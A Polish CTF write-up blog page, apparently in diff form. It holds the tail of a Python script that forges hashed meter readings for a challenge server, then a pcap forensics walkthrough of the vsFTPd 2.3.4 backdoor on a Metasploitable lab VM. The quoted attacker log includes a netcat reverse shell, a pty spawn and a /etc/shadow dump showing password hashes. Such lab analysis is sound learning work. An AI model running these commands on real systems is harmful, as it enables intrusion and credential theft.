+</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>urljoin(_BASE_URL_, _C_ENDP_)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> reversed(range(<span style=color:#ae81ff>1</span>, int(md_day))):
+</span></span><span style=display:flex><span>        hsh <span style=color:#f92672>=</span> calc_hash(md_counter, i, schema)
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;counter&#34;</span>: int(md_counter),
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;day&#34;</span>: int(i),
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;hash&#34;</span>: hsh,
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        print(payload)
+</span></span><span style=display:flex><span>        print(url)
+</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, headers<span style=color:#f92672>=</span>_HEADERS_, data<span style=color:#f92672>=</span>json<span style=color:#f92672>.</span>dumps(payload))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[+] </span><span style=color:#e6db74>{</span>payload<span style=color:#e6db74>}</span><span style=color:#e6db74> succeded!&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[-] ERROR: </span><span style=color:#e6db74>{</span>r<span style=color:#f92672>.</span>status_code<span style=color:#e6db74>}</span><span style=color:#e6db74>, </span><span style=color:#e6db74>{</span>r<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>urljoin(_BASE_URL_, _I_ENDP_)
+</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(u
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[+] Done! </span><span style=color:#e6db74>{</span>r<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    solve()
+</span></span></code></pre></div><p>I otrzymujemy odpowiedź od serwera:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;html&gt;&lt;body&gt;&lt;b&gt;<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;Jan Kowalski&#34;</span>,<span style=color:#e6db74>&#34;days&#34;</span>:156,<span style=color:#e6db74>&#34;comment&#34;</span>:<span style=color:#e6db74>&#34;Brawo, jesteś wojownikiem, który wygrał z miernikiem.&#34;</span>,<span style=color:#e6db74>&#34;amount&#34;</span>:0<span style=color:#f92672>}</span>&lt;/b&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span><span style=display:flex><span>3666.54
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;Jan Kowalski&#34;</span>,<span style=color:#e6db74>&#34;days&#34;</span>:156,<span style=color:#e6db74>&#34;comment&#34;</span>:<span style=color:#e6db74>&#34;Faktura za rok 2020&#34;</span>,<span style=color:#e6db74>&#34;amount&#34;</span>:3666.54<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>curl -ksi -X GET https://gas-challenge.herokuapp.com/stats
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>42</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;2a-T2u8n8OuVFmstuEtGFZaJOB/RGs&#34;</span>
+</span></span><span style=display:flex><span>Date: Thu, <span style=color:#ae81ff>04</span> Jun <span style=color:#ae81ff>2020</span> 19:51:40 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>get: <span style=color:#ae81ff>1997</span> post:745 validposts:723 solved:1
+</span></span></code></pre></div><h1 id=0x06-podsumowanie-smart-metering-challenge>0x06 Podsumowanie Smart Metering Challenge<a href=#0x06-podsumowanie-smart-metering-challenge class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Zadanie zajęło mi kilkanaście minut, ale skłoniło do głębszego zapoznania się z algorytmami MAC (Message Authentication Code), bo początkowo obstawiałem jakąś błędną implementację MAC/HMAC. Maila wysłałem o godzinie 21:53 CEST i okazuje się, że byłem pierwszy :) więc udało się wygrać. Serdecznie dziękuję za fajne wyzwanie :)</p><p>W kolejnym tygodniu organizatorzy tego zadania udostępnili kolejne zadanie <a href=https://wladcysieci.pl/2020/06/03/konkurs-capture-the-flag/>tutaj</a>. Udało mi się je rozwiązać jeszcze w trakcie trwania webinaru, po czym okazało się, że albo nie zrozumiałem dokładnie czym są flagi, albo ktoś się na webinarze przejęzyczył. Natomiast post wszystko klaryfikuje i udało się dosłać brakujące rozwiązanie, co znowu zagwarantowało TOP1 zgłaszających. Zadanie jest na tyle proste i krótkie, że nie będę tworzył następnego postu tylko opiszę je poniżej.</p><h1 id=0x07-bonus---pcapng>0x07 Bonus - pcapng<a href=#0x07-bonus---pcapng class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Tym razem wyzwanie było z pogranicza dziedziny <code>forensics</code>, która nigdy nie była moją mocną stroną, natomiast jest ono na tyle trywialne, że można je rozwiązać kilkoma kliknięciami.</p><p>Na wejściu otrzymujemy plik <code>challenge.pcapng</code>. Autorzy zalecali pobranie Wiresharka (dobrze, że nie zdradzili od razu flag (; ), natomiast część zadania dużo łatwiej wykonać w Network Monitorze, co oczywiście nie jest obowiązkowe i wspomniany Wireshark czy t-shark sobie bez problemu poradzą.</p><p>Pierwszym krokiem, aby wrzucić pcapng do NM była konwersja z pliku pcapng do zwykłego pcapa, ponieważ darmowa wersja Network Monitora wspiera ten format zapisu.</p><p>Pcapng to pcap-&rsquo;next-generation&rsquo;, gdyby kogoś zainteresowały różnice to proponuję te dwa krótkie dokumenty <a href=https://www.tcpdump.org/manpages/pcap-savefile.5.html>1</a> i <a href=https://tools.ietf.org/html/draft-tuexen-opsawg-pcapng-01>2</a>. Natomiast nie trzeba znać różnic w tych formatach aby móc konwertować je między sobą. Można skorzystać z dowolnego serwisu, który z tego korzysta. Można też wykorzystać t-sharka:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tshark -F pcap -r <span style=color:#f92672>{</span>pcapng file<span style=color:#f92672>}</span> -w <span style=color:#f92672>{</span>pcap file<span style=color:#f92672>}</span>
+</span></span></code></pre></div><p>Przez co otrzymujemy gotowy pcap. Wrzucony w Network Minera pokaże nam taki ekran:</p><p><img src=./networkminer1.png alt=networkminer_1></p><p>Co pomaga odpowiedzieć na pytanie kto był atakującym, kto ofiarą i z jakich systemów korzystali.</p><p>Dodatkowo w zakładce files:</p><p><img src=./networkminer2.png alt=networkminer_2></p><p>Mamy plik flag3, który posiada zakodowaną w BASE64 flagę <code>Nemezis</code>.
+<img src=./networkminer3.png alt=networkminer_3></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ cat flag
+</span></span><span style=display:flex><span><span style=color:#75715e>#Aby uzyskac flage, rozkoduj ponizszy ciag znakow.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#hint: flaga to mityczna postac</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TmVtZXppcw<span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>~/devp/tmp ❯ echo -ne <span style=color:#e6db74>&#34;TmVtZXppcw=&#34;</span> | base64 -d 
+</span></span><span style=display:flex><span>Nemezis
+</span></span></code></pre></div><p>To niestety nie wystarczyło do rozwiązania zadania i trzeba było opisać jeszcze scenariusz ataku oraz wyciągnąć flagę2. Grep na stringsach wyzwania nie pokazywał innych ciągów &ldquo;flag&rdquo;, co było dość podejrzane. Coś mnie podkusiło aby sprawdzić bardziej h4xi0rski3 nazwy, takie jak <code>fl4g</code> i moim oczom ukazało się</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fl4g2:!:18415:0:99999:7:::
+</span></span></code></pre></div><p>Co było drugą flagą. Teraz wystarczyło wyszukać te bajty w ramkach pcapa i podać ich numery.</p><p>Pozostała pierwsza czyli analiza scenariusza ataku. Pierwsze co rzuca się w oczy to dość dużo prób połączeń na wszystkie porty. Jest to oczywiście skan Nmapem co potwierdza kolejny prosty grep:</p><pre tabindex=0><code>&lt;p&gt;The requested URL /nmaplowercheck1591109516 was not found on this server.&lt;/p&gt;
+</code></pre><p>Teraz możemy wrzucić plik w Wiresharka.</p><p>Jest to jeden z ciągów, który pozwala stwierdzić, że dany host jest skanowany tym właśnie narzędziem. Po drodze było kilka innych i serdecznie zachęcam do manualnego sprawdzenia.</p><p>Co się zaś tyczy dalszego rozwoju wydarzeń, warto skorzystać z opcji <code>Follow TCP stream</code> na strumieniu TCP oraz przejść się po kolejnych. Okazuje się, że nawiązane jest dłuższe połączenie. To próba logowania do FTP i wrzucenie pliku flag3. Przy okazji rzucić się w oczy może próba zalogowania do telnetu oraz późniejsze odwołanie do portu <code>6200</code>. Otóż vsFTPd w wersji 2.3.4 jest zbackdoorowany. Proba logowania z wykorzystaniem ciągu <code>:)</code> powoduje rozpoczęcie nasłuchiwania na porcie 6200 przez proces z uprawnieniami roota. Poniżej polecenia wykonywane w czasie działania atakującego przez tego shella.</p><p><img src=wireshark.png alt=wireshark></p><p>Poniżej log działalności atakującego.</p><pre tabindex=0><code>220 (vsFTPd 2.3.4)
+USER root
+331 Please specify the password.
+PASS
+530 Login incorrect.
+SYST
+530 Please login with USER and PASS.
+QUIT
+221 Goodbye.
+
+
+
+# próby z ftp
+220 (vsFTPd 2.3.4)
+USER anonymous
+331 Please specify the password.
+PASS
+230 Login successful.
+SYST
+215 UNIX Type: L8
+PORT 10,0,2,18,134,155
+200 PORT command successful. Consider using PASV.
+LIST
+150 Here comes the directory listing.
+226 Directory send OK.
+TYPE I
+200 Switching to Binary mode.
+PORT 10,0,2,18,221,197
+200 PORT command successful. Consider using PASV.
+RETR flag3
+150 Opening BINARY mode data connection for flag3 (97 bytes).
+226 Transfer complete.
+QUIT
+221 Goodbye.
+#Aby uzyskac flage, rozkoduj ponizszy ciag znakow.
+#hint: flaga to mityczna postac
+
+TmVtZXppcw=
+220 (vsFTPd 2.3.4)
+USER 7HWPr:)  # backdor
+331 Please specify the password.
+PASS i
+
+
+id
+uid=0(root) gid=0(root)
+nohup &gt;/dev/null 2&gt;&amp;1
+echo kKSjS4rQdtIGsu62
+kKSjS4rQdtIGsu62
+iid
+sh: line 4: iid: command not found
+id
+uid=0(root) gid=0(root)
+name -a
+sh: line 6: name: command not found
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+python -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;
+[1] Exit 1 nc -nv -e /bin/bash 10.0.2.18 4444 2&gt; /dev/null
+root@metasploitable:/# cd /home
+cd /home
+root@metasploitable:/home# ls
+ls
+.[00m.[01;34mftp.[00m .[01;34mmsfadmin.[00m .[01;34mservice.[00m .[01;34muser.[00m
+.[mroot@metasploitable:/home# cd msfadmin
+cd msfadmin
+root@metasploitable:/home/msfadmin# ls
+ls
+.[00m.[01;34mvulnerable.[00m
+.[mroot@metasploitable:/home/msfadmin# cd ..
+cd ..
+root@metasploitable:/home# ls
+ls
+.[00m.[01;34mftp.[00m .[01;34mmsfadmin.[00m .[01;34mservice.[00m .[01;34muser.[00m
+.[mroot@metasploitable:/home# cd service
+cd service
+root@metasploitable:/home/service# ls
+ls
+.[00m.[mroot@metasploitable:/home/service# cd ..
+cd ..
+root@metasploitable:/home# cd user
+cd user
+root@metasploitable:/home/user# ls
+ls
+.[00m.[mroot@metasploitable:/home/user# cd ..
+cd ..
+root@metasploitable:/home# cd ftp
+cd ftp
+root@metasploitable:/home/ftp# ls
+ls
+.[00m.[00mflag3.[00m
+.[mroot@metasploitable:/home/ftp# cat flag3
+cat flag3
+#Aby uzyskac flage, rozkoduj ponizszy ciag znakow.
+#hint: flaga to mityczna postac
+TmVtZXppcw=
+root@metasploitable:/home/ftp# cd ..
+cd ..
+root@metasploitable:/home# cat /etc/issue
+cat /etc/issue
+_ _ _ _ _ _ ____
+_ __ ___ ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \
+| &#39;_ ` _ \ / _ \ __/ _` / __| &#39;_ \| |/ _ \| | __/ _` | &#39;_ \| |/ _ \ __) |
+| | | | | | __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | | __// __/
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+|_|
+Warning: Never expose this VM to an untrusted network!
+Contact: msfdev[at]metasploit.com
+Login with msfadmin/msfadmin to get started
+root@metasploitable:/home# cat /etc/shadow
+cat /etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+fl4g2:!:18415:0:99999:7:::
+root@metasploitable:/home# crontab -l
+crontab -l
+no crontab for root
+root@metasploitable:/home# netstat -antp
+netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
+tcp 0 0 0.0.0.0:512 0.0.0.0:* LISTEN 4483/xinetd
+tcp 0 0 0.0.0.0:37056 0.0.0.0:* LISTEN -
+tcp 0 0 0.0.0.0:513 0.0.0.0:* LISTEN 4483/xinetd
+tcp 0 0 0.0.0.0:2049 0.0.0.0:* LISTEN -
+tcp 0 0 0.0.0.0:514 0.0.0.0:* LISTEN 4483/xinetd
+tcp 0 0 0.0.0.0:48456 0.0.0.0:* LISTEN 4391/rpc.mountd
+tcp 0 0 0.0.0.0:8009 0.0.0.0:* LISTEN 4579/jsvc
+tcp 0 0 0.0.0.0:6697 0.0.0.0:* LISTEN 4634/unrealircd
+tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 4223/mysqld
+tcp 0 0 0.0.0.0:1099 0.0.0.0:* LISTEN 4616/rmiregistry
+tcp 0 0 0.0.0.0:6667 0.0.0.0:* LISTEN 4634/unrealircd
+tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN 4467/smbd
+tcp 0 0 0.0.0.0:5900 0.0.0.0:* LISTEN 4637/Xtightvnc
+tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 3709/portmap
+tcp 0 0 0.0.0.0:6000 0.0.0.0:* LISTEN 4637/Xtightvnc
+tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 4597/apache2
+tcp 0 0 0.0.0.0:8787 0.0.0.0:* LISTEN 4620/ruby
+tcp 0 0 0.0.0.0:8180 0.0.0.0:* LISTEN 4579/jsvc
+tcp 0 0 0.0.0.0:1524 0.0.0.0:* LISTEN 4483/xinetd
+tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN 4483/xinetd
+tcp 0 0 10.0.2.19:53 0.0.0.0:* LISTEN 4083/named
+tcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN 4083/named
+tcp 0 0 0.0.0.0:59733 0.0.0.0:* LISTEN 3726/rpc.statd
+tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN 4483/xinetd
+tcp 0 0 0.0.0.0:6200 0.0.0.0:* LISTEN 4920/sh
+tcp 0 0 0.0.0.0:5432 0.0.0.0:* LISTEN 4302/postgres
+tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN 4458/master
+tcp 0 0 127.0.0.1:953 0.0.0.0:* LISTEN 4083/named
+tcp 0 0 0.0.0.0:45210 0.0.0.0:* LISTEN 4616/rmiregistry
+tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN 4467/smbd
+tcp 0 0 10.0.2.19:6200 10.0.2.18:44589 ESTABLISHED 4920/sh
+tcp 1 0 10.0.2.19:21 10.0.2.18:39275 CLOSE_WAIT 4921/vsftpd
+tcp6 0 0 :::2121 :::* LISTEN 4523/proftpd: (acce
+tcp6 0 0 :::3632 :::* LISTEN 4328/distccd
+tcp6 0 0 :::53 :::* LISTEN 4083/named
+tcp6 0 0 :::22 :::* LISTEN 4105/sshd
+tcp6 0 0 :::5432 :::* LISTEN 4302/postgres
+tcp6 0 0 ::1:953 :::* LISTEN 4083/named
+root@metasploitable:/home# mysql -uroot -p
+mysql -uroot -p
+Enter password:
+Welcome to the MySQL monitor. Commands end with ; or \g.
+Your MySQL connection id is 8
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the buffer.
+mysql&gt; show databases;
+show databases;
++--------------------+
+| Database |
++--------------------+
+| information_schema |
+| dvwa |
+| metasploit |
+| mysql |
+| owasp10 |
+| tikiwiki |
+| tikiwiki195 |
++--------------------+
+7 rows in set (0.00 sec)
+mysql&gt; quit
+quit
+Bye
+root@metasploitable:/home# ping google.com
+ping google.com
+PING google.com (216.58.215.110) 56(84) bytes of data.
+64 bytes from waw02s17-in-f14.1e100.net (216.58.215.110): icmp_seq=1 ttl=55 time=28.4 ms
+64 bytes from waw02s17-in-f14.1e100.net (216.58.215.110): icmp_seq=2 ttl=55 time=30.2 ms
+64 bytes from waw02s17-in-f14.1e100.net (216.58.215.110): icmp_seq=3 ttl=55 time=28.3 ms
+64 bytes from waw02s17-in-f14.1e100.net (216.58.215.110): icmp_seq=4 ttl=55 time=31.7 ms
+64 bytes from waw02s17-in-f14.1e100.net (216.58.215.110): icmp_seq=5 ttl=55 time=27.6 ms
+.
+--- google.com ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 3999ms
+rtt min/avg/max/mdev = 27.614/29.274/31.739/1.516 ms
+root@metasploitable:/home# cd /tmp
+cd /tmp
+root@metasploitable:/tmp# ls
+ls
+.[00m.[00m4579.jsvc_up.[00m
+.[mroot@metasploitable:/tmp# echo &#34;Dziekuje za uczesnictwo w konkursie :)&#34;
+echo &#34;Dziekuje za uczesnictwo w konkursie :)&#34;
+Dziekuje za uczesnictwo w konkursie :)
+root@metasploitable:/tmp#
+</code></pre><p>To wszystko, tak rozwiązane zadanie zostało zaakceptowane przez organizatorów. Znowu udało się wygrać. Dziękuję za fajne wyzwanie. Mam dwa zastrzeżenia do tego wyzwania. Zadania konkursowe oparte o popularne DVWA są oklepane i raczej słabe, bo dysponując zerową wiedzą na dany temat można je rozwiązać nie patrząc prawie na pcapa <a href=https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide>klik</a>. Cieszy natomiast inwencja twórcza i dodatkowa flaga :). Do tego fajnie by było gdyby flagi miały konkretny format jeśli jest ich kilka. O ile w przypadku pierwszego wyzwania cel jest jasny, to tutaj miałem srogie &ldquo;wtf&rdquo; widząc wpis do <code>/etc/passwd</code> i spędziłem chwilę w poszukiwaniu jakiś hashy. Jasny format flag (nie trzeba podpowiadać, że są zakodowane) znacząco uprzyjemniłby (ale niekoniecznie ułatwił) rozgrywkę.</p><h1 id=0x08-koniec>0x08 Koniec<a href=#0x08-koniec class=hanchor arialabel=Anchor>&#8983;</a></h1><p>To już naprawdę wszystko z mojej strony. Czekam na kolejne wyzwania, może znowu uda się skończyć na jakiejś wysokiej pozycji. Dziękuję Organizatorom za zabawę!</p></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>copyright by foxtrot_charlie</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://foxtrotlabs.cc/assets/main.js></script><script src=https://foxtrotlabs.cc/assets/prism.js></script></div></body></html>
